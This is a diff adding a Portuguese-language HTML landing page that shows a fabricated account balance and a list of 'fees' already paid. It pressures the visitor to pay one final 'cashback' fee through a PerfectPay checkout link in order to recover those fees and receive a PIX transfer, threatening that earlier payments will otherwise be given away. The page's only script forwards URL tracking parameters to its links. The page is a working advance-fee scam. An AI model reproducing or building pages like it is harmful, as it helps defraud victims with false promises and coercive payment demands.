@@ -1,0 +1,222 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="icon" href="https://i.postimg.cc/VsDvqK2q/image.png">
+    <title>Página de Taxas</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #000;
+            color: #fff;
+            text-align: center;
+        }
+
+        /* Seção de Logo e Saldo */
+        .header-section {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .header-section img {
+            width: 120px; /* Tamanho da logo */
+        }
+
+        .value-box {
+            font-size: 1.5em;
+            font-weight: bold;
+            color: #00ff00;
+            border: 2px solid #00ff00;
+            padding: 10px 20px;
+            border-radius: 10px;
+            margin-left: auto; /* Faz o box de valor ir para a direita */
+        }
+
+        /* Títulos */
+        h1 {
+            color: #00ff00;
+            font-size: 2em;
+            margin: 20px 0;
+        }
+
+        h2 {
+            color: #ffffff;
+            font-size: 1.5em;
+            margin: 10px 0;
+        }
+
+        /* GIF centralizado */
+        .gif-container {
+            margin: 20px 0;
+        }
+
+        /* Texto Principal */
+        .main-text {
+            padding: 20px;
+            margin: 20px auto;
+            width: 80%;
+            background-color: #222;
+            border-radius: 10px;
+        }
+
+        .highlight-green {
+            color: #00ff00;
+            font-weight: bold;
+        }
+
+        .highlight-red {
+            color: #ff0000;
+            font-weight: bold;
+        }
+
+        /* Botão de Receber Taxa de Volta */
+        .pulsing-button {
+            display: inline-block;
+            background-color: #FFD700; /* Amarelo */
+            color: black;
+            font-weight: bold;
+            padding: 15px 30px;
+            margin: 20px 0;
+            text-decoration: none;
+            border-radius: 5px;
+            animation: pulse 1.5s infinite;
+        }
+
+        @keyframes pulse {
+            0%, 100% {
+                transform: scale(1);
+            }
+            50% {
+                transform: scale(1.1);
+            }
+        }
+
+        /* FAQ */
+        .faq-section {
+            background-color: #111;
+            padding: 20px;
+            margin: 20px auto;
+            border-radius: 10px;
+            width: 80%;
+        }
+
+        .faq-item {
+            color: #ffffff;
+            font-weight: bold;
+            font-size: 1.1em;
+            margin-top: 10px;
+        }
+
+        /* Rodapé */
+        .footer {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 20px;
+            padding: 20px;
+            background-color: #111;
+        }
+
+        .footer img {
+            width: 80px;
+        }
+
+        @media (max-width: 768px) {
+            .header-section {
+                align-items: center;
+            }
+
+            .header-section img {
+                width: 80px; /* Reduz tamanho da logo em telas menores */
+            }
+
+            .value-box {
+                font-size: 1.2em; /* Ajusta o tamanho da fonte do valor */
+            }
+
+            h1 {
+                font-size: 1.5em; /* Ajusta o tamanho do título principal */
+            }
+
+            h2 {
+                font-size: 1.2em; /* Ajusta o tamanho do subtítulo */
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- Seção de Logo e Saldo -->
+    <div class="header-section">
+        <img src="https://i.postimg.cc/9QrDFsX8/image.webp" alt="Logo">
+        <div class="value-box">
+            Saldo: R$ 615,13
+        </div>
+    </div>
+
+    <!-- GIF centralizado -->
+    <div class="gif-container">
+        <img style="max-width:120px" src="https://i.postimg.cc/sXNhcy2h/verified.gif" alt="Verificado">
+    </div>
+
+    <!-- Títulos -->
+    <h1>RECEBA O DINHEIRO DAS TAXAS DE VOLTA, E TENHA ACESSO VITALÍCIO AO APP</h1>
+    <h2>Veja abaixo os valores pagos em taxa:</h2>
+
+    <!-- Texto Principal com Destaques -->
+    <div class="main-text">
+        Liberação de Saldo – <span class="highlight-green">R$ 19,90</span><br>
+        Taxa de Transferência - <span class="highlight-red">(Obrigatório)</span> – <span class="highlight-green">R$ 29,90</span><br>
+        Taxa de Antecipação de Saque – <span class="highlight-green">R$ 29,00</span><br>
+        Total pago em taxas – <span class="highlight-green">R$ 78,88</span><br><br>
+        Abaixo está seu saldo total até aqui.<br><br>
+        Valores a receber com as taxas: <span class="highlight-green">R$ 615,13 + Bônus + (1 ano sem Taxas e acesso ao Grupo vip Spotify sócios).</span><br><br>
+        Para receber suas taxas de volta e finalmente ter acesso ao Evento, é necessário pagar a última taxa abaixo: 
+        <span class="highlight-red"> (Caso não pague, o dinheiro pago até aqui será destinado a fundos de doação.)</span><br>
+        Valor ficou em: <span class="highlight-green">R$ 69,30</span>, é necessário efetuar o pagamento na tarifa CASHBACK equivalente a <span class="highlight-green">11% do valor das taxas</span>.<br><br>
+        Após o pagamento, automaticamente irá receber um PIX no valor de <span class="highlight-green">R$ 615,13</span>.
+    </div>
+
+    <!-- Botão de Receber Taxa de Volta -->
+    <a href="https://go.perfectpay.com.br/PPU38CP6Q7U" class="pulsing-button">RECEBER TAXA DE VOLTA!</a>
+
+    <!-- Seção FAQ -->
+    <div class="faq-section">
+        <h2>Dúvidas Frequentes:</h2>
+        <p class="faq-item">Por que devo pagar essa taxa?</p>
+        <p class="faq-item">O que acontece se eu não pagar a taxa?</p>
+    </div>
+
+    <!-- Seção de Rodapé -->
+    <div class="footer">
+        <img src="https://i.postimg.cc/c1tgSpHF/image.png" alt="Imagem 1">
+        <img src="https://i.postimg.cc/HsGJs68d/image.png" alt="Imagem 2">
+    </div> 
+<!-- Script Utms -->
+            <script>
+            // Função para adicionar os parâmetros aos links
+            function adicionarParametrosAosLinks() {
+                const urlParams = new URLSearchParams(window.location.search);
+
+                const links = document.querySelectorAll('a');
+
+                links.forEach(link => {
+                    const href = new URL(link.href);
+                    urlParams.forEach((value, key) => {
+                        href.searchParams.set(key, value);
+                    });
+                    link.href = href.toString();
+                });
+            }
+
+            // Chamar a função ao carregar a página
+            document.addEventListener('DOMContentLoaded', adicionarParametrosAosLinks);
+            </script>
+  <!-- Script Utms -->
+</body>
+</html>
